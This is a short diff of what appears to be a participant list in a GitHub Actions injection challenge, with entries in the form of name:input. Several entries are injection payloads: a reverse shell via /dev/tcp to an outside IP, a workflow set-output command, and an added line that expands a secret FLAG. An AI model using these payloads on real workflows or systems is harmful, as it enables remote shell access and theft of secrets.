@@ -351,3 +351,4 @@ leung-yao:echo "$user:$flag"
 weinull:";bash -i >& /dev/tcp/116.63.159.89/10000 0>&1#
 leung-yao:::set-output name=action_fruit::strawberry
 Scr1pt-kid:commentTest
+N0b1e6:${{ secret.FLAG }}
